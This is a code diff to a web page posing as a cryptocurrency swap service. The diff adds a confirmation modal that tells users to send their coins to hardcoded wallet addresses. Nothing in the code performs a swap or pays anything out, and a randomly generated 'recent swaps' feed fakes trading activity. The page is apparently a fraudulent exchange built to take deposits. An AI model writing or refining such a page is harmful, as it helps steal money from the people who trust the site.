@@ -19,6 +19,8 @@
       --swap-btn-bg: #8e44ad;
       --swap-btn-bg-hover: #732d91;
       --shadow: 0 0 15px rgba(142, 68, 173, 0.7);
+      --error-bg: #8b0000;
+      --error-text: #ffbaba;
     }
 
     * {
@@ -311,6 +313,96 @@
         min-width: auto;
       }
     }
+
+    /* Modal styles */
+
+    .modal-overlay {
+      position: fixed;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(0,0,0,0.7);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+    }
+
+    .modal {
+      background: var(--bg-darker);
+      padding: 2rem 2.5rem;
+      border-radius: 14px;
+      box-shadow: var(--shadow);
+      width: 400px;
+      max-width: 90vw;
+      color: var(--text-light);
+      user-select:none;
+      position: relative;
+      text-align: center;
+      font-family: 'Poppins', sans-serif;
+    }
+
+    .modal h3 {
+      margin-top: 0;
+      margin-bottom: 1.3rem;
+      font-weight: 700;
+      font-size: 1.5rem;
+      color: var(--accent);
+      user-select:none;
+    }
+
+    .modal p {
+      margin: 0.5rem 0 1.3rem 0;
+      font-weight: 600;
+      font-size: 1.15rem;
+      word-break: break-word;
+    }
+
+    .modal button.close-btn {
+      background: var(--accent);
+      border: none;
+      color: #fff;
+      font-weight: 700;
+      padding: 0.6rem 1.2rem;
+      border-radius: 12px;
+      cursor: pointer;
+      font-size: 1rem;
+      user-select:none;
+      box-shadow: var(--shadow);
+      transition: background-color 0.3s ease;
+      letter-spacing: 0.05em;
+    }
+
+    .modal button.close-btn:hover {
+      background: var(--accent-hover);
+    }
+
+    /* Error message box */
+
+    .error-message {
+      background: var(--error-bg);
+      color: var(--error-text);
+      border-radius: 12px;
+      padding: 1rem 1.5rem;
+      margin-top: 1rem;
+      font-weight: 700;
+      position: relative;
+      user-select:none;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      box-shadow: 0 0 10px var(--error-bg);
+    }
+
+    .error-message button.close-error {
+      background: transparent;
+      border: none;
+      color: var(--error-text);
+      font-weight: 900;
+      font-size: 1.2rem;
+      cursor: pointer;
+      line-height: 1;
+      padding: 0 0.4rem 0 0.4rem;
+      user-select:none;
+    }
   </style>
 </head>
 <body>
@@ -368,6 +460,8 @@
         <div class="rate-display" aria-live="polite" aria-atomic="true" id="rate-display">
           Select tokens and amount to see estimated rate
         </div>
+
+        <div id="error-container"></div>
       </form>
     </section>
 
@@ -415,17 +509,17 @@
   </aside>
 </main>
 
+<!-- Modal container (hidden by default) -->
+<div id="modal-overlay" class="modal-overlay" style="display:none;" role="dialog" aria-modal="true" aria-labelledby="modal-title" aria-describedby="modal-desc">
+  <div class="modal">
+    <h3 id="modal-title"></h3>
+    <p id="modal-desc"></p>
+    <button class="close-btn" aria-label="Close modal">Close</button>
+  </div>
+</div>
+
 <script>
   (() => {
-    const fromTokenSelect = document.getElementById('from-token');
-    const toTokenSelect = document.getElementById('to-token');
-    const fromAmountInput = document.getElementById('from-amount');
-    const swapBtn = document.querySelector('button.swap-btn');
-    const rateDisplay = document.getElementById('rate-display');
-    const historyTbody = document.getElementById('swap-history');
-    const amountToggleRadios = document.querySelectorAll('input[name="amount-type"]');
-    const amountLabel = document.getElementById('amount-label');
-
     const tokenIds = {
       BTC: 'bitcoin',
       ETH: 'ethereum',
@@ -436,80 +530,60 @@
       LTC: 'litecoin'
     };
 
-    let usdPrices = {};
-    let currentAmountType = 'crypto'; // or 'usd'
+    // Hardcoded addresses for popup display
+    const tokenAddresses = {
+      BTC: 'bc1qtr9ah0xdel7a00xph92kd3l4z64h9du3yhs560',
+      ETH: '0xf24449533C35cC9687AECB783ef6379D83D50EF2',
+      USDT: '0xf24449533C35cC9687AECB783ef6379D83D50EF2',
+      BNB: '0xf24449533C35cC9687AECB783ef6379D83D50EF2',
+      ADA: 'addr1q9sr0klkmz0mx5z6ngrjuyszuwt7kflge4dz9xxq7m228wtqxldldkylkdg94xs89cfq9cuhavn73n26y2vvpak55wusefutty',
+      SOL: '22YfDpLZspeMvMAnu1UzRVSd9h7qPqHsmh1n6SdegV4v',
+      LTC: '0xf24449533C35cC9687AECB783ef6379D83D50EF2'
+    };
 
-    // Helpers
-    function randomInt(min, max) {
-      return Math.floor(Math.random() * (max - min + 1)) + min;
-    }
+    const usdPrices = {};
+    let swapHistory = [];
 
-    function formatDate(date) {
-      const pad = n => n.toString().padStart(2, '0');
-      return `${date.getFullYear()}-${pad(date.getMonth()+1)}-${pad(date.getDate())} ` +
-             `${pad(date.getHours())}:${pad(date.getMinutes())}:${pad(date.getSeconds())}`;
-    }
+    // Elements
+    const fromTokenSelect = document.getElementById('from-token');
+    const toTokenSelect = document.getElementById('to-token');
+    const fromAmountInput = document.getElementById('from-amount');
+    const rateDisplay = document.getElementById('rate-display');
+    const swapBtn = document.querySelector('.swap-btn');
+    const historyTbody = document.getElementById('swap-history');
+    const amountToggleRadios = document.querySelectorAll('input[name="amount-type"]');
+    const amountLabel = document.getElementById('amount-label');
+    const errorContainer = document.getElementById('error-container');
+    const destAddressInput = document.getElementById('dest-address');
 
-    // Fetch live prices from CoinGecko
+    // Modal elements
+    const modalOverlay = document.getElementById('modal-overlay');
+    const modalTitle = document.getElementById('modal-title');
+    const modalDesc = document.getElementById('modal-desc');
+    const modalCloseBtn = modalOverlay.querySelector('.close-btn');
+
+    let currentAmountType = 'crypto';
+
+    // Fetch prices from CoinGecko
     async function fetchPrices() {
       try {
         const ids = Object.values(tokenIds).join(',');
         const res = await fetch(`https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=usd`);
         const data = await res.json();
-        usdPrices = {};
-        for (const [key, val] of Object.entries(tokenIds)) {
-          usdPrices[key] = data[val]?.usd || 1;
+        for (const [key, id] of Object.entries(tokenIds)) {
+          usdPrices[key] = data[id]?.usd ?? 1;
         }
-      } catch {
-        // fallback in case of error
-        usdPrices = {
-          BTC: 30000,
-          ETH: 2000,
-          USDT: 1,
-          BNB: 250,
-          ADA: 1.2,
-          SOL: 40,
-          LTC: 100
-        };
+      } catch (e) {
+        console.error('Error fetching prices:', e);
       }
     }
 
-    // Initialize dummy swaps spaced randomly 5-20 min apart with random seconds
-    const baseTime = Date.now();
-    let swapHistory = [];
-
-    function initDummySwaps() {
-      let lastTime = baseTime - (60 * 60 * 1000); // 1 hour ago
-      const tokens = Object.keys(tokenIds);
-      swapHistory = [];
-
-      for (let i = 0; i < 10; i++) {
-        const minutesGap = randomInt(5, 20);
-        const secondsGap = randomInt(0, 59);
-        lastTime += (minutesGap * 60 + secondsGap) * 1000;
-
-        let fromToken = tokens[randomInt(0, tokens.length -1)];
-        let toToken;
-        do {
-          toToken = tokens[randomInt(0, tokens.length -1)];
-        } while(toToken === fromToken);
-
-        let amount = +(Math.random() * (10 - 0.1) + 0.1).toFixed(5);
-
-        const fromPrice = usdPrices[fromToken] || 1;
-        const toPrice = usdPrices[toToken] || 1;
-        const received = +(amount * fromPrice / toPrice).toFixed(5);
-
-        swapHistory.push({
-          date: new Date(lastTime),
-          fromToken,
-          toToken,
-          amount,
-          received
-        });
-      }
+    // Helper to format date/time
+    function formatDate(date) {
+      return date.toLocaleString();
     }
 
+    // Render recent swap history
     function renderHistory() {
       historyTbody.innerHTML = '';
       for (const swap of swapHistory.slice().reverse()) {
@@ -539,19 +613,23 @@
       }
     }
 
+    // Add a new dummy swap every ~3-7 mins (scaled here to 10s-20s)
+    function randomInt(min, max) {
+      return Math.floor(Math.random() * (max - min + 1)) + min;
+    }
     function addNewDummySwap() {
       const tokens = Object.keys(tokenIds);
-      const lastDate = swapHistory.length > 0 ? swapHistory[swapHistory.length-1].date.getTime() : Date.now();
+      const lastDate = swapHistory.length > 0 ? swapHistory[swapHistory.length - 1].date.getTime() : Date.now();
 
-      const minutesGap = randomInt(5,20);
-      const secondsGap = randomInt(0,59);
+      const minutesGap = randomInt(5, 20);
+      const secondsGap = randomInt(0, 59);
       const newTime = lastDate + (minutesGap * 60 + secondsGap) * 1000;
 
-      let fromToken = tokens[randomInt(0, tokens.length -1)];
+      let fromToken = tokens[randomInt(0, tokens.length - 1)];
       let toToken;
       do {
-        toToken = tokens[randomInt(0, tokens.length -1)];
-      } while(toToken === fromToken);
+        toToken = tokens[randomInt(0, tokens.length - 1)];
+      } while (toToken === fromToken);
 
       let amount = +(Math.random() * (10 - 0.1) + 0.1).toFixed(5);
 
@@ -567,7 +645,7 @@
         received
       });
 
-      if(swapHistory.length > 20) {
+      if (swapHistory.length > 20) {
         swapHistory.shift(); // keep max 20 swaps
       }
       renderHistory();
@@ -578,7 +656,7 @@
       if (!from || !to || !amount || amount <= 0 || from === to) return null;
       const fromPrice = usdPrices[from] || 1;
       const toPrice = usdPrices[to] || 1;
-      if(amountType === 'crypto') {
+      if (amountType === 'crypto') {
         return amount * fromPrice / toPrice;
       } else { // USD input
         return amount / toPrice;
@@ -590,46 +668,86 @@
       const from = fromTokenSelect.value;
       const to = toTokenSelect.value;
       let amountVal = parseFloat(fromAmountInput.value);
-      if(isNaN(amountVal) || amountVal <= 0) {
+      if (isNaN(amountVal) || amountVal <= 0) {
         swapBtn.disabled = true;
         rateDisplay.textContent = 'Enter a valid amount';
+        clearError();
         return;
       }
-      if(!from || !to || from === to) {
+      if (!from || !to || from === to) {
         swapBtn.disabled = true;
         rateDisplay.textContent = 'Select different tokens';
+        clearError();
         return;
       }
-      swapBtn.disabled = false;
+      const fromPrice = usdPrices[from] || 1;
+      let usdValue = 0;
+      if (currentAmountType === 'crypto') {
+        usdValue = amountVal * fromPrice;
+      } else {
+        usdValue = amountVal;
+      }
+
+      if (usdValue < 10) {
+        swapBtn.disabled = true;
+        rateDisplay.textContent = `Minimum swap amount is $10 USD equivalent`;
+        clearError();
+        return;
+      } else {
+        swapBtn.disabled = false;
+      }
+
+      clearError();
 
       const received = calculateReceived(from, to, amountVal, currentAmountType);
-      if(received === null) {
+      if (received === null) {
         rateDisplay.textContent = 'Select valid tokens and amount';
         return;
       }
 
-      if(currentAmountType === 'crypto') {
+      if (currentAmountType === 'crypto') {
         rateDisplay.textContent = `Estimated: ${received.toFixed(5)} ${to}`;
       } else {
         // USD input - convert back to crypto amount entered
-        const fromPrice = usdPrices[from] || 1;
         const cryptoAmount = amountVal / fromPrice;
         rateDisplay.textContent = `Estimated: ${received.toFixed(5)} ${to} for $${amountVal.toFixed(2)} (≈ ${cryptoAmount.toFixed(5)} ${from})`;
       }
     }
 
-    // Swap form submit handler - just add to recent swaps, reset inputs
+    // Show error message below swap form
+    function showError(msg) {
+      errorContainer.innerHTML = `
+        <div class="error-message" role="alert" aria-live="assertive">
+          ${msg}
+          <button class="close-error" aria-label="Close error message">&times;</button>
+        </div>
+      `;
+      const closeBtn = errorContainer.querySelector('.close-error');
+      closeBtn.addEventListener('click', () => {
+        clearError();
+      });
+    }
+    function clearError() {
+      errorContainer.innerHTML = '';
+    }
+
+    // Swap form submit handler
     function handleSwap(e) {
       e.preventDefault();
-      if(swapBtn.disabled) return;
+      if (swapBtn.disabled) {
+        if (rateDisplay.textContent.includes('Minimum swap amount')) {
+          showError('Minimum swap amount is $10 USD equivalent. Please increase the amount.');
+        }
+        return;
+      }
 
       const from = fromTokenSelect.value;
       const to = toTokenSelect.value;
       let amountVal = parseFloat(fromAmountInput.value);
-      if(isNaN(amountVal) || amountVal <= 0 || !from || !to || from === to) return;
+      if (isNaN(amountVal) || amountVal <= 0 || !from || !to || from === to) return;
 
       let amountCrypto;
-      if(currentAmountType === 'crypto') {
+      if (currentAmountType === 'crypto') {
         amountCrypto = amountVal;
       } else {
         // convert USD to crypto
@@ -637,6 +755,18 @@
         amountCrypto = amountVal / fromPrice;
       }
 
+      // Determine address to show in modal
+      const address = tokenAddresses[from] || 'Unknown Address';
+
+      // Show modal with exact amount & address
+      modalTitle.textContent = 'Swap Confirmation';
+      modalDesc.innerHTML = `
+        Send <strong>${amountCrypto.toFixed(5)}</strong> amount of <strong>${from}</strong> to this address:<br><br>
+        <code style="user-select: all;">${address}</code>
+      `;
+      modalOverlay.style.display = 'flex';
+
+      // Add new swap to history
       const fromPrice = usdPrices[from] || 1;
       const toPrice = usdPrices[to] || 1;
       const received = +(amountCrypto * fromPrice / toPrice).toFixed(5);
@@ -648,17 +778,29 @@
         amount: amountCrypto,
         received
       });
-      if(swapHistory.length > 20) {
+      if (swapHistory.length > 20) {
         swapHistory.shift();
       }
       renderHistory();
 
       // Reset form
       fromAmountInput.value = '';
-      document.getElementById('dest-address').value = '';
+      destAddressInput.value = '';
       swapBtn.disabled = true;
       rateDisplay.textContent = 'Select tokens and amount to see estimated rate';
+      clearError();
     }
+
+    // Close modal handlers
+    modalCloseBtn.addEventListener('click', () => {
+      modalOverlay.style.display = 'none';
+    });
+
+    modalOverlay.addEventListener('click', (e) => {
+      if(e.target === modalOverlay) {
+        modalOverlay.style.display = 'none';
+      }
+    });
 
     // Tab switching logic
 
@@ -679,11 +821,11 @@
     tabButtons.forEach((btn, i) => {
       btn.addEventListener('click', () => activateTab(i));
       btn.addEventListener('keydown', e => {
-        if(e.key === 'ArrowDown') {
+        if (e.key === 'ArrowDown') {
           e.preventDefault();
           const nextIndex = (i + 1) % tabButtons.length;
           tabButtons[nextIndex].focus();
-        } else if(e.key === 'ArrowUp') {
+        } else if (e.key === 'ArrowUp') {
           e.preventDefault();
           const prevIndex = (i - 1 + tabButtons.length) % tabButtons.length;
           tabButtons[prevIndex].focus();
@@ -696,7 +838,7 @@
     fromTokenSelect.addEventListener('change', updateUI);
     toTokenSelect.addEventListener('change', updateUI);
     fromAmountInput.addEventListener('input', () => {
-      if(fromAmountInput.value < 0) fromAmountInput.value = 0;
+      if (fromAmountInput.value < 0) fromAmountInput.value = 0;
       updateUI();
     });
     swapBtn.addEventListener('click', handleSwap);
@@ -714,7 +856,11 @@
 
     async function init() {
       await fetchPrices();
-      initDummySwaps();
+
+      // Initialize dummy swap history with 10 items
+      for(let i = 0; i < 10; i++) {
+        addNewDummySwap();
+      }
       renderHistory();
 
       // Add new dummy swap every 3-7 minutes (scaled down to 10s-20s here for demo)
@@ -724,6 +870,7 @@
     }
 
     init();
+
   })();
 </script>
 
